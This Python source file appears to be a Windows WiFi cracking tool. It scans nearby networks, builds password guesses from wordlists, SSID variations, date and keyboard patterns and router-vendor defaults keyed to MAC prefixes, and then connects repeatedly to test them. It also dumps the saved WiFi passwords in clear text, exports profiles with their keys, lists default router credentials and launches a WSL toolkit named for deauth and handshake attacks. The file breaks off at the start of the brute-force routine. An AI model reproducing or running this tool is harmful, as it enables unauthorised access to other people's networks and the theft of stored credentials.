import subprocess
import json
import pyfiglet
import platform
import os
import itertools
import re
from time import sleep
from rich.console import Console
from rich.table import Table
from rich import print
from rich.progress import Progress
from datetime import datetime

console = Console()

class WifiBruteForces:
    def __init__(self):
        self.pass_file = "./wordlists/default.txt"
        self.interface = "Wi-Fi"
        self.pass_folder_path = "./wordlists"
        self.wifi_networks = None
        self.target_id = None  # Initialize target_id to None
        self.attack_mode = "wordlist" # wordlist, smart, numeric
        self.passwords_list = []

    def extract_saved_passwords(self):
        """Extract passwords from all saved WiFi profiles on this computer"""
        print("\n[bold cyan]Extracting Saved WiFi Passwords...[/]")
        try:
            # Get all saved profiles
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True, text=True
            )

            if result.returncode != 0:
                print("[bold red]Failed to retrieve profiles[/]")
                return

            profiles = []
            for line in result.stdout.split("\n"):
                if "All User Profile" in line or "Current User Profile" in line:
                    profile_name = line.split(":")[1].strip()
                    if profile_name:
                        profiles.append(profile_name)

            if not profiles:
                print("[bold yellow]No saved WiFi profiles found.[/]")
                return

            table = Table(show_header=True, header_style="bold green")
            table.add_column("SSID", style="dim")
            table.add_column("Password", style="bold yellow")
            table.add_column("Authentication")

            for profile in profiles:
                try:
                    key_result = subprocess.run(
                        ["netsh", "wlan", "show", "profile", f'name={profile}', "key=clear"],
                        capture_output=True, text=True
                    )

                    password = "(No password / Open)"
                    auth = "Unknown"

                    for line in key_result.stdout.split("\n"):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                        elif "Authentication" in line:
                            auth = line.split(":")[1].strip()

                    table.add_row(profile, password, auth)
                except Exception:
                    table.add_row(profile, "(Error)", "Unknown")

            console.print(table)
            print(f"\n[bold green]Found {len(profiles)} saved profiles![/]")

        except Exception as e:
            print(f"[bold red]Error: {e}[/]")

        input("\nPress Enter to continue...")

    def show_open_networks(self):
        """Scan and show networks with weak or no security"""
        print("\n[bold cyan]Scanning for Open/Weak Networks...[/]")
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                capture_output=True, text=True
            )

            lines = result.stdout.split("\n")
            networks = []
            current = {}

            for line in lines:
                if line.startswith("SSID"):
                    if current:
                        networks.append(current)
                    current = {"SSID": line.split(":", 1)[1].strip()}
                elif "Authentication" in line:
                    current["Auth"] = line.split(":")[1].strip()
                elif "Encryption" in line:
                    current["Encryption"] = line.split(":")[1].strip()
                elif "Signal" in line:
                    current["Signal"] = line.split(":")[1].strip()
            if current:
                networks.append(current)

            # Filter weak networks
            weak = [n for n in networks if n.get("Auth", "") in ["Open", "WEP", ""] or n.get("Encryption", "") == "None"]

            if weak:
                print(f"\n[bold red]Found {len(weak)} Open/Weak Networks:[/]")
                table = Table(show_header=True, header_style="bold red")
                table.add_column("SSID")
                table.add_column("Authentication")
                table.add_column("Encryption")
                table.add_column("Signal")
                for n in weak:
                    table.add_row(n.get("SSID", ""), n.get("Auth", "Open"), n.get("Encryption", "None"), n.get("Signal", ""))
                console.print(table)
            else:
                print("[bold green]No open or weak networks found nearby.[/]")

            # Also show WPA networks (can be attacked)
            wpa = [n for n in networks if "WPA" in n.get("Auth", "")]
            print(f"\n[bold yellow]Found {len(wpa)} WPA/WPA2 Networks (require password)[/]")

        except Exception as e:
            print(f"[bold red]Error: {e}[/]")

        input("\nPress Enter to continue...")

    def show_router_defaults(self):
        """Show common default passwords for popular router brands"""
        print("\n[bold cyan]Common Router Default Passwords:[/]")

        defaults = {
            "TP-Link": ["admin/admin", "admin/", "12345678", "admin1234"],
            "Netgear": ["admin/password", "admin/1234", "password"],
            "D-Link": ["admin/admin", "admin/", "user/user"],
            "Linksys": ["admin/admin", "admin/", "linksys"],
            "ASUS": ["admin/admin", "admin/password", "admin/1234"],
            "Huawei": ["admin/admin", "admin/HuaweiUser", "telecomadmin/admintelecom"],
            "ZTE": ["admin/admin", "user/user", "zte/zte"],
            "Xiaomi": ["admin/", "admin/admin", "12345678"],
            "Tenda": ["admin/admin", "admin/"],
            "Cisco": ["cisco/cisco", "admin/admin"],
            "Belkin": ["admin/", "Admin/"],
            "Generic ISP": ["admin/admin", "user/user", "1234/1234", "admin/1234"]
        }

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Router Brand", style="bold")
        table.add_column("Default Credentials (user/pass or WiFi pass)")

        for brand, passwords in defaults.items():
            table.add_row(brand, ", ".join(passwords))

        console.print(table)

        print("\n[bold yellow]Note:[/] These are admin panel and default WiFi passwords.")
        print("Many ISP-provided routers use the serial number or MAC address as default password.")

        input("\nPress Enter to continue...")

    def export_all_profiles(self):
        """Export all saved WiFi profiles to XML files"""
        print("\n[bold cyan]Exporting All Saved WiFi Profiles...[/]")

        export_dir = "./exported_profiles"
        os.makedirs(export_dir, exist_ok=True)

        try:
            result = subprocess.run(
                ["netsh", "wlan", "export", "profile", f"folder={export_dir}", "key=clear"],
                capture_output=True, text=True
            )

            if result.returncode == 0:
                # Count exported files
                files = [f for f in os.listdir(export_dir) if f.endswith(".xml")]
                print(f"[bold green]Successfully exported {len(files)} profiles to {export_dir}[/]")
                print("\nExported files:")
                for f in files:
                    print(f"  - {f}")
            else:
                print(f"[bold red]Export failed: {result.stderr}[/]")

        except Exception as e:
            print(f"[bold red]Error: {e}[/]")

        input("\nPress Enter to continue...")

    def generate_qr_code(self):
        """Generate QR codes for saved WiFi networks (requires qrcode library)"""
        print("\n[bold cyan]WiFi QR Code Generator[/]")
        print("This feature generates QR codes that can be scanned to connect to WiFi.\n")

        try:
            import qrcode
        except ImportError:
            print("[bold yellow]qrcode library not installed. Install with: pip install qrcode[pil][/]")
            print("\nManual WiFi QR Format: WIFI:T:WPA;S:SSID_HERE;P:PASSWORD_HERE;;")
            input("\nPress Enter to continue...")
            return

        # Get saved profiles with passwords
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        profiles = []
        for line in result.stdout.split("\n"):
            if "All User Profile" in line or "Current User Profile" in line:
                name = line.split(":")[1].strip()
                if name:
                    profiles.append(name)

        if not profiles:
            print("[bold yellow]No saved profiles found.[/]")
            input("\nPress Enter to continue...")
            return

        print("Available networks:")
        for i, p in enumerate(profiles, 1):
            print(f"  {i}. {p}")

        try:
            choice = int(input("\nSelect network number: "))
            if 1 <= choice <= len(profiles):
                ssid = profiles[choice - 1]

                # Get password
                key_result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    capture_output=True, text=True
                )

                password = ""
                auth = "WPA"
                for line in key_result.stdout.split("\n"):
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                    elif "Authentication" in line:
                        auth_type = line.split(":")[1].strip()
                        if "WPA2" in auth_type or "WPA3" in auth_type:
                            auth = "WPA"
                        elif "Open" in auth_type:
                            auth = "nopass"
                        else:
                            auth = "WPA"

                # Create QR code string
                wifi_string = f"WIFI:T:{auth};S:{ssid};P:{password};;"

                os.makedirs("./qrcodes", exist_ok=True)
                qr_path = f"./qrcodes/{ssid}_wifi.png"

                qr = qrcode.QRCode(version=1, box_size=10, border=5)
                qr.add_data(wifi_string)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                img.save(qr_path)

                print(f"\n[bold green]QR Code saved to: {qr_path}[/]")
                print(f"WiFi String: {wifi_string}")
        except ValueError:
            print("[bold red]Invalid selection[/]")

        input("\nPress Enter to continue...")

    def signal_strength_monitor(self):
        """Monitor WiFi signal strength in real-time"""
        print("\n[bold cyan]WiFi Signal Strength Monitor[/]")
        print("Press Ctrl+C to stop monitoring.\n")

        try:
            while True:
                result = subprocess.run(
                    ["netsh", "wlan", "show", "networks", "mode=bssid"],
                    capture_output=True, text=True
                )

                self.clearscr()
                print("[bold cyan]WiFi Signal Strength Monitor[/] (Press Ctrl+C to stop)\n")

                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("SSID", style="dim")
                table.add_column("Signal", style="bold")
                table.add_column("Strength Bar")
                table.add_column("BSSID")

                lines = result.stdout.split("\n")
                current = {}

                for line in lines:
                    if line.startswith("SSID"):
                        if current and current.get("SSID"):
                            signal = current.get("Signal", "0%")
                            signal_val = int(signal.replace("%", ""))
                            bar_len = signal_val // 10
                            bar = "█" * bar_len + "░" * (10 - bar_len)

                            if signal_val >= 70:
                                color = "green"
                            elif signal_val >= 40:
                                color = "yellow"
                            else:
                                color = "red"

                            table.add_row(
                                current.get("SSID", ""),
                                f"[{color}]{signal}[/]",
                                f"[{color}]{bar}[/]",
                                current.get("BSSID", "")
                            )
                        current = {"SSID": line.split(":", 1)[1].strip()}
                    elif "BSSID" in line and ":" in line:
                        parts = line.split(":", 1)
                        if len(parts) > 1:
                            current["BSSID"] = parts[1].strip()
                    elif "Signal" in line:
                        current["Signal"] = line.split(":")[1].strip()

                # Add last network
                if current and current.get("SSID"):
                    signal = current.get("Signal", "0%")
                    signal_val = int(signal.replace("%", ""))
                    bar_len = signal_val // 10
                    bar = "█" * bar_len + "░" * (10 - bar_len)
                    color = "green" if signal_val >= 70 else ("yellow" if signal_val >= 40 else "red")
                    table.add_row(current.get("SSID", ""), f"[{color}]{signal}[/]", f"[{color}]{bar}[/]", current.get("BSSID", ""))

                console.print(table)
                print(f"\n[dim]Last updated: {datetime.now().strftime('%H:%M:%S')}[/]")
                sleep(3)

        except KeyboardInterrupt:
            print("\n[bold yellow]Monitoring stopped.[/]")

        input("\nPress Enter to continue...")

    def generate_pattern_passwords(self):
        """Generate passwords based on common patterns"""
        patterns = []
        ssid = self.target_id if self.target_id else ""

        print("\n[bold cyan]Pattern-Based Password Generator[/]")
        print("Generating passwords based on common patterns...\n")

        # 1. Phone number patterns (common in many countries)
        print("- Adding phone number patterns...")
        # 10-digit patterns
        patterns.extend(["1234567890", "0123456789", "9876543210"])

        # 2. Date patterns (DDMMYYYY, MMDDYYYY, YYYYMMDD)
        print("- Adding date patterns...")
        current_year = datetime.now().year
        for year in range(current_year - 5, current_year + 1):
            for month in ["01", "06", "12"]:
                for day in ["01", "15", "25"]:
                    patterns.append(f"{day}{month}{year}")
                    patterns.append(f"{month}{day}{year}")
                    patterns.append(f"{year}{month}{day}")

        # 3. Keyboard patterns
        print("- Adding keyboard patterns...")
        keyboard_patterns = [
            "qwertyui", "qwerty12", "qwerty123", "asdfghjk", "zxcvbnm1",
            "1qaz2wsx", "qazwsxed", "12qwaszx", "!QAZ2wsx", "1q2w3e4r",
            "q1w2e3r4", "zaq12wsx", "1234qwer", "qwer1234", "asdf1234",
            "1234asdf", "qweasdzx", "1234rewq", "poiuytre", "lkjhgfds"
        ]
        patterns.extend(keyboard_patterns)

        # 4. Repeated patterns
        print("- Adding repeated character patterns...")
        for char in "0123456789":
            patterns.append(char * 8)
        for word in ["aaa", "abc", "123", "111", "999"]:
            patterns.append(word * 3)
            patterns.append(word * 4)

        # 5. Name + numbers (common format)
        print("- Adding name+number patterns...")
        common_names = ["admin", "user", "guest", "wifi", "home", "office", "internet", "network"]
        for name in common_names:
            patterns.append(name + "123")
            patterns.append(name + "1234")
            patterns.append(name + "12345")
            patterns.append(name + "@123")
            patterns.append(name.capitalize() + "123")

        # 6. SSID-based patterns
        if ssid:
            print(f"- Adding SSID-based patterns for '{ssid}'...")
            ssid_clean = re.sub(r'[^a-zA-Z0-9]', '', ssid)
            patterns.append(ssid_clean + "123")
            patterns.append(ssid_clean + "1234")
            patterns.append(ssid_clean + "@123")
            patterns.append(ssid_clean.lower() + "wifi")
            patterns.append(ssid_clean + str(current_year))

        # 7. Leetspeak variations
        print("- Adding leetspeak patterns...")
        leet_passwords = ["p@ssw0rd", "P@ssw0rd", "p4ssw0rd", "p@55w0rd", "P@55word"]
        patterns.extend(leet_passwords)

        # Filter to valid lengths (8+ chars for WPA)
        valid_patterns = [p for p in patterns if len(p) >= 8]

        print(f"\n[bold green]Generated {len(valid_patterns)} pattern-based passwords[/]")
        return list(set(valid_patterns))

    def combination_attack(self):
        """Run all attack methods in sequence"""
        print("\n[bold cyan]Combination Attack[/]")
        print("This will try all attack methods in sequence:\n")
        print("1. Vendor/MAC defaults")
        print("2. Smart SSID variations")
        print("3. Pattern-based passwords")
        print("4. Wordlist attack")
        print("")

        all_passwords = []

        # 1. MAC-based
        if hasattr(self, 'target_bssid') and self.target_bssid:
            print("[bold yellow]Phase 1:[/] Generating vendor defaults...")
            all_passwords.extend(self.generate_mac_based_passwords())

        # 2. Smart passwords
        print("[bold yellow]Phase 2:[/] Generating SSID variations...")
        all_passwords.extend(self.generate_smart_passwords())

        # 3. Pattern passwords
        print("[bold yellow]Phase 3:[/] Generating pattern passwords...")
        all_passwords.extend(self.generate_pattern_passwords())

        # 4. Small wordlist
        print("[bold yellow]Phase 4:[/] Loading common passwords...")
        try:
            with open("./wordlists/default.txt", "r") as f:
                wordlist = f.read().splitlines()[:500]  # Only first 500
                all_passwords.extend(wordlist)
        except:
            pass

        # Remove duplicates
        all_passwords = list(set(all_passwords))
        print(f"\n[bold green]Total unique passwords to try: {len(all_passwords)}[/]")

        return all_passwords

    def show_connected_devices(self):
        """Show devices connected to the same network (ARP scan)"""
        print("\n[bold cyan]Network Device Scanner[/]")
        print("Scanning for devices on the local network...\n")

        try:
            # Get current IP configuration
            result = subprocess.run(["ipconfig"], capture_output=True, text=True)
            gateway = None

            for line in result.stdout.split("\n"):
                if "Default Gateway" in line:
                    parts = line.split(":")
                    if len(parts) > 1:
                        gw = parts[1].strip()
                        if gw:
                            gateway = gw
                            break

            if gateway:
                print(f"Gateway: {gateway}")

            # Get ARP table
            arp_result = subprocess.run(["arp", "-a"], capture_output=True, text=True)

            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("IP Address")
            table.add_column("MAC Address")
            table.add_column("Type")

            for line in arp_result.stdout.split("\n"):
                parts = line.split()
                if len(parts) >= 3:
                    ip = parts[0]
                    mac = parts[1]
                    type_ = parts[2] if len(parts) > 2 else "unknown"

                    # Filter valid entries
                    if re.match(r'\d+\.\d+\.\d+\.\d+', ip):
                        table.add_row(ip, mac, type_)

            console.print(table)

        except Exception as e:
            print(f"[bold red]Error: {e}[/]")

        input("\nPress Enter to continue...")

    def launch_wsl_toolkit(self):
        """Launch the advanced toolkit in WSL"""
        print("\n[bold cyan]Launching Advanced Toolkit in WSL...[/]")
        print("This requires:")
        print("1. WSL (Windows Subsystem for Linux) installed")
        print("2. A USB WiFi adapter capable of Monitor Mode")
        print("3. USBIPD configured to pass the USB device to WSL")
        print("\nAttempting to launch...")

        try:
            # Check if wsl is available
            check = subprocess.run(["wsl", "--status"], capture_output=True)
            if check.returncode != 0:
                print("[bold red]WSL is not installed or not running.[/]")
                print("Please install WSL to use advanced attacks (PMKID, Handshake, Deauth).")
                input("\nPress Enter to continue...")
                return

            # Get current directory path for WSL
            # Convert Windows path to WSL path (e.g., C:\Users -> /mnt/c/Users)
            current_dir = os.getcwd()
            drive = current_dir[0].lower()
            path = current_dir[2:].replace("\\", "/")
            wsl_path = f"/mnt/{drive}{path}"

            script_path = f"{wsl_path}/wsl_toolkit.py"

            print(f"[bold yellow]Executing: sudo python3 {script_path}[/]")
            print("You may be asked for your WSL sudo password.")

            # Launch in a new window if possible, or current
            # We use 'wsl' command to run python3
            cmd = f'start cmd /k "wsl sudo python3 {script_path}"'
            os.system(cmd)

        except Exception as e:
            print(f"[bold red]Error launching WSL: {e}[/]")

        input("\nPress Enter to return to menu...")

    def generate_wlan_report(self):
        """Generate Windows WLAN Report (requires Admin)"""
        print("\n[bold cyan]Generating WLAN Report...[/]")
        print("This report contains connection history, errors, and system info.")
        print("[bold yellow]Note: This requires Administrator privileges.[/]")

        try:
            # netsh wlan show wlanreport
            result = subprocess.run(["netsh", "wlan", "show", "wlanreport"], capture_output=True, text=True)

            if "successfully" in result.stdout or "Report written" in result.stdout:
                # Default location: C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html
                report_path = r"C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html"

                if os.path.exists(report_path):
                    local_path = os.path.abspath("./wlan_report.html")
                    import shutil
                    shutil.copy2(report_path, local_path)
                    print(f"[bold green]Report generated successfully![/]")
                    print(f"Saved to: {local_path}")

                    open_now = input("Open report now? (y/n): ")
                    if open_now.lower() == 'y':
                        os.startfile(local_path)
                else:
                    print("[bold red]Report generated but file not found at expected location.[/]")
            else:
                print(f"[bold red]Failed to generate report. Ensure you are running as Admin.[/]")
                print(f"Error: {result.stdout}")

        except Exception as e:
            print(f"[bold red]Error: {e}[/]")

        input("\nPress Enter to continue...")

    def show_credits(self):
        print("\n[bold cyan]Credits:[/]")
        print("Original Author: morpheuslord")
        print("Repository: https://github.com/morpheuslord/WinFiHack")
        print("Enhanced by: GitHub Copilot")
        print("\nPress Enter to continue...")
        input()

    def clearscr(self):
        try:
            osp = platform.system()
            if osp in ["Darwin", "Linux"]:
                os.system("clear")
            elif osp == "Windows":
                os.system("cls")
        except Exception as e:
            print(f"Failed to clear screen: {e}")

    def get_network_interfaces(self):
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True
            )
            if result.returncode == 0:
                lines = result.stdout.split("\n")
                interfaces = []
                current_interface = {}
                interface_id = 1
                for line in lines:
                    if line.strip().startswith("Name"):
                        if current_interface:
                            current_interface["ID"] = interface_id
                            interfaces.append(current_interface)
                            current_interface = {}
                            interface_id += 1
                        parts = line.split(":")
                        name = parts[1].strip()
                        current_interface["Interface Name"] = name
                    elif line.strip().startswith("Description"):
                        description = line.split(":")[1].strip()
                        current_interface["Description"] = description
                    elif line.strip().startswith("State"):
                        state = line.split(":")[1].strip()
                        current_interface["State"] = state
                    elif line.strip().startswith("Type"):
                        type_ = line.split(":")[1].strip()
                        current_interface["Type"] = type_
                    elif line.strip().startswith("Radio status"):
                        radio_status = line.split(":")[1].strip()
                        current_interface["Radio status"] = radio_status
                if current_interface:
                    current_interface["ID"] = interface_id
                    interfaces.append(current_interface)
                self.interface_data = json.dumps(interfaces, indent=4)
                return self.interface_data
            else:
                self.interface_data = json.dumps(
                    {"error": "Failed to retrieve interfaces", "message": result.stderr},
                    indent=4,
                )
                return self.interface_data
        except Exception as e:
            print(f"Error getting network interfaces: {e}")
            self.interface_data = json.dumps(
                {"error": "Failed to retrieve interfaces", "message": str(e)}, indent=4
            )
            return self.interface_data

    def get_wifi_networks(self):
        try:
            disconnect_result = subprocess.run(
                ["netsh", "wlan", "disconnect", f"interface={self.interface}"],
                capture_output=True,
                text=True,
            )
            if disconnect_result.returncode != 0:
                self.wifi_networks = json.dumps(
                    {
                        "error": "Failed to disconnect from Wi-Fi",
                        "message": disconnect_result.stderr,
                    },
                    indent=4,
                )
                return self.wifi_networks

            sleep(5)
            result = subprocess.run(
                ["netsh", "wlan", "show", "network", "mode=bssid", f"interface={self.interface}"],
                capture_output=True,
                text=True,
            )
            if result.returncode == 0:
                lines = result.stdout.split("\n")
                networks = []
                current_network = {}
                network_id = 1
                for line in lines:
                    if line.startswith("SSID"):
                        if current_network:
                            current_network["ID"] = network_id
                            networks.append(current_network)
                            current_network = {}
                            network_id += 1
                        parts = line.split(":")
                        ssid = parts[1].strip()
                        current_network["SSID"] = ssid
                    elif line.strip().startswith("Network type"):
                        network_type = line.split(":")[1].strip()
                        current_network["Network type"] = network_type
                    elif line.strip().startswith("Authentication"):
                        authentication = line.split(":")[1].strip()
                        current_network["Authentication"] = authentication
                    elif line.strip().startswith("Encryption"):
                        encryption = line.split(":")[1].strip()
                        current_network["Encryption"] = encryption
                    elif line.strip().startswith("BSSID 1"):
                        parts = line.split(":", 1)
                        if len(parts) > 1:
                            bssid = parts[1].strip()
                            current_network["BSSID"] = bssid
                if current_network:
                    current_network["ID"] = network_id
                    networks.append(current_network)
                self.wifi_networks = json.dumps(networks, indent=4)
            else:
                self.wifi_networks = json.dumps(
                    {"error": "Failed to retrieve Wi-Fi networks", "message": result.stderr},
                    indent=4,
                )
        except Exception as e:
            print(f"Error getting Wi-Fi networks: {e}")
            self.wifi_networks = json.dumps({"error": "Failed to retrieve Wi-Fi networks", "message": str(e)}, indent=4)
        return self.wifi_networks

    def render_json_as_table(self):
        try:
            if not self.wifi_networks:
                print("[bold red]No Wi-Fi networks found or failed to retrieve them.[/]")
                return

            data = json.loads(self.wifi_networks)
            table = Table(show_header=True, header_style="bold magenta")
            if data and isinstance(data, list):
                for key in data[0].keys():
                    table.add_column(key, style="dim")
                for item in data:
                    table.add_row(*[str(item[key]) for key in item.keys()])
            console.print(table)
        except json.JSONDecodeError as e:
            print(f"[bold red]Failed to decode JSON: {str(e)}[/]")

    def selection_process(self):
        while True:
            try:
                if not self.wifi_networks:
                    return "rescan"

                network_data = json.loads(self.wifi_networks)

                # Handle error case where network_data is a dict with error info
                if isinstance(network_data, dict) and "error" in network_data:
                    print(f"[bold red]Scan Error: {network_data.get('message', 'Unknown error')}[/]")
                    if input("Press 'r' to rescan, or Enter to exit: ").lower() == 'r':
                        return "rescan"
                    return "error"

                user_input = input("Enter SSID ID (or 'r' to rescan, 'c' for credits): ")

                if user_input.lower() == 'r':
                    return "rescan"
                elif user_input.lower() == 'c':
                    return "credits"

                ID = int(user_input)
                selected_network = next(
                    (network for network in network_data if network["ID"] == ID),
                    None
                )
                if selected_network:
                    self.target_id = selected_network["SSID"]
                    self.target_bssid = selected_network.get("BSSID", "")
                    return "selected"
                else:
                    print("No network found with the given ID.")
            except ValueError:
                print("Please enter a valid ID.")
            except Exception as e:
                print(f"Error selecting network: {e}")
                return "error"

    def render_interfaces_table(self):
        try:
            interfaces = json.loads(self.interface_data)
            if not interfaces or not isinstance(interfaces, list):
                print("[bold red]No interfaces found[/]")
                return
            table = Table(show_header=True, header_style="bold magenta")
            # Dynamically add columns based on available keys
            if interfaces:
                for key in interfaces[0].keys():
                    table.add_column(key, style="dim")
                for iface in interfaces:
                    table.add_row(*[str(iface.get(key, "")) for key in interfaces[0].keys()])
            console.print(table)
        except json.JSONDecodeError as e:
            print(f"[bold red]Failed to decode JSON: {str(e)}[/]")
        except Exception as e:
            print(f"Error rendering interfaces table: {e}")

    def select_interface(self):
        try:
            interfaces = json.loads(self.interface_data)
            ID = int(input("Enter interface ID to select: "))
            selected_interface = next(
                (iface for iface in interfaces if iface["ID"] == ID), None
            )
            if selected_interface:
                self.interface = selected_interface["Interface Name"]
            else:
                print("Invalid interface ID.")
        except ValueError:
            print("Please enter a valid ID.")
        except Exception as e:
            print(f"Error selecting interface: {e}")

    def create_wifi_profile_xml(self, passphrase):
        try:
            networks = json.loads(self.wifi_networks)
            network_info = next(
                (item for item in networks if item["SSID"] == self.target_id),
                None
            )

            if not network_info:
                print(f"No network information found for SSID: {self.target_id}")
                return False

            # Convert SSID to hexadecimal representation
            ssid_hex = "".join("{:02X}".format(ord(c)) for c in self.target_id)

            xml_content = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{self.target_id}</name>
    <SSIDConfig>
        <SSID>
            <name>{self.target_id}</name>
            <hex>{ssid_hex}</hex>
        </SSID>
        <nonBroadcast>false</nonBroadcast>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <autoSwitch>false</autoSwitch>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{passphrase}</keyMaterial>
            </sharedKey>
            <keyIndex>0</keyIndex>
        </security>
    </MSM>
</WLANProfile>"""

            self.xml_path = f"./xml/{self.target_id}.xml"
            with open(self.xml_path, "w") as file:
                file.write(xml_content)

            return True
        except Exception as e:
            print(f"Error creating Wi-Fi profile XML: {e}")
            return False

    def connect_wifi_and_verify_with_interface(self):
        try:
            # Add the Wi-Fi profile
            add_profile_cmd = f'netsh wlan add profile filename="{self.xml_path}" interface="{self.interface}"'
            subprocess.run(add_profile_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Connect to the Wi-Fi network
            connect_cmd = f'netsh wlan connect name="{self.target_id}" interface="{self.interface}"'
            subprocess.run(connect_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait for the connection to establish (Polling optimization)
            # Check every 0.5s, up to 4 seconds
            for _ in range(8):
                sleep(0.5)
                check_cmd = f'netsh wlan show interface name="{self.interface}"'
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)

                # If connected, return immediately
                if f"SSID                   : {self.target_id}" in result.stdout:
                    print(f"Connected to {self.target_id} on interface {self.interface}")
                    return True

            return False
        except Exception as e:
            print(f"Error connecting to Wi-Fi network: {e}")
            return False

    def list_passfiles(self):
        try:
            files = [
                file
                for file in os.listdir(self.pass_folder_path)
                if os.path.isfile(os.path.join(self.pass_folder_path, file))
            ]
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Number", style="dim", width=12)
            table.add_column("File Name", min_width=20)
            files_dict = {}
            for index, file in enumerate(files, start=1):
                files_dict[str(index)] = file
                table.add_row(str(index), file)
            console.print(table)
            while True:
                selection = console.input(
                    "[bold green]Enter the number of the passfile you want to select (0 to use default): [/]"
                )
                if selection == "0":
                    self.pass_file = "./wordlists/default.txt"
                    break
                elif selection in files_dict:
                    self.pass_file = os.path.join(self.pass_folder_path, files_dict[selection])
                    break
                else:
                    console.print(
                        "[bold red]Invalid selection. Please enter a valid number.[/]"
                    )
        except Exception as e:
            print(f"Error listing pass files: {e}")

    def select_attack_mode(self):
        try:
            print("\n[bold cyan]Select Attack Mode:[/]")
            print("1. Wordlist Attack (Load from file)")
            print("2. Smart Attack (SSID variations)")
            print("3. Numeric Range Attack (e.g. 12345678)")
            print("4. Vendor/MAC Attack (Default passwords based on OUI)")
            print("5. Pattern Attack (Phone, dates, keyboard patterns)")
            print("6. Combination Attack (All methods combined)")

            choice = input("Enter choice (1-6): ")

            if choice == "1":
                self.attack_mode = "wordlist"
                self.list_passfiles()
                try:
                    with open(self.pass_file, "r") as file:
                        self.passwords_list = file.read().splitlines()
                except FileNotFoundError:
                    print("Password file not found.")
                    self.passwords_list = []
            elif choice == "2":
                self.attack_mode = "smart"
                self.passwords_list = self.generate_smart_passwords()
            elif choice == "3":
                self.attack_mode = "numeric"
                self.passwords_list = self.generate_numeric_range()
            elif choice == "4":
                self.attack_mode = "mac"
                self.passwords_list = self.generate_mac_based_passwords()
            elif choice == "5":
                self.attack_mode = "pattern"
                self.passwords_list = self.generate_pattern_passwords()
            elif choice == "6":
                self.attack_mode = "combination"
                self.passwords_list = self.combination_attack()
            else:
                print("Invalid choice, defaulting to Wordlist Attack")
                self.attack_mode = "wordlist"
                self.list_passfiles()
                try:
                    with open(self.pass_file, "r") as file:
                        self.passwords_list = file.read().splitlines()
                except FileNotFoundError:
                    self.passwords_list = []
        except Exception as e:
            print(f"Error selecting attack mode: {e}")
            self.passwords_list = []

    def generate_smart_passwords(self):
        passwords = []
        ssid = self.target_id
        if not ssid:
            return []

        # Basic variations
        passwords.append(ssid)
        passwords.append(ssid.lower())
        passwords.append(ssid.upper())
        passwords.append(ssid + "123")
        passwords.append(ssid + "1234")
        passwords.append(ssid + "2023")
        passwords.append(ssid + "2024")
        passwords.append(ssid + "2025")

        # Split by space if applicable
        parts = ssid.split(" ")
        if len(parts) > 1:
            for part in parts:
                passwords.append(part)
                passwords.append(part + "123")

        return list(set(passwords))

    def generate_numeric_range(self):
        print("Generating numeric passwords (8 digits)...")
        passwords = []
        # Common patterns
        passwords.extend(["12345678", "87654321", "00000000", "11111111"])
        return passwords

    def generate_mac_based_passwords(self):
        passwords = []
        if not self.target_bssid:
            print("[bold red]No BSSID found for this network. Cannot perform MAC attack.[/]")
            return []

        # Clean MAC address (remove colons/dashes and make uppercase)
        mac_clean = self.target_bssid.replace(":", "").replace("-", "").upper()
        oui = mac_clean[:6]

        print(f"Detected OUI: {oui} (MAC: {self.target_bssid})")

        # Common OUI Database (Simplified)
        # You can expand this list based on online OUI databases
        oui_db = {
            "TP-LINK": ["D80D17", "C025E9", "50C7BF", "E894F6", "98DED0", "6032B1"],
            "NETGEAR": ["A00460", "204E7F", "E0469A", "9C3DCF"],
            "HUAWEI": ["F86E8F", "00E0FC", "286ED4", "88E3AB"],
            "XIAOMI": ["640980", "28D127", "D4970B"],
            "ZTE": ["FC12F6", "98F537", "CC4463"],
            "DLINK": ["00179A", "1CBFCE", "28107B"],
            "ASUS": ["049226", "001FD2", "BCEE7B"]
        }

        vendor = "UNKNOWN"
        for v, ouis in oui_db.items():
            if oui in ouis:
                vendor = v
                break

        print(f"Identified Vendor: [bold green]{vendor}[/]")

        # Vendor specific defaults
        if vendor == "TP-LINK":
            passwords.extend(["12345670", "12345678", "admin1234", "admin123"])
            # TP-Link often uses last 8 chars of MAC as default password in some models
            passwords.append(mac_clean[-8:])
        elif vendor == "NETGEAR":
            passwords.extend(["password", "admin", "12345678", "netgear1"])
            # Netgear often uses adjective+noun+3digits (e.g. happycat123) - hard to guess without dict
        elif vendor == "HUAWEI":
            passwords.extend(["admin123", "Huawei123", "12345678", "admin@huawei"])
        elif vendor == "XIAOMI":
            passwords.extend(["12345678", "admin123"])
        elif vendor == "ZTE":
            passwords.extend(["admin", "admin123", "zte12345"])
        elif vendor == "DLINK":
            passwords.extend(["", "admin", "password", "12345678"])
        elif vendor == "ASUS":
            passwords.extend(["admin", "password", "12345678", "admin123"])

        # Always add generic defaults
        passwords.extend(["12345678", "1234567890", "admin123", "password", "admin"])

        return list(set(passwords))

    def brute_force_wifi(self):
        passwords = self.passwords_list
        if not passwords:
            print("No passwords to try.")
            return False

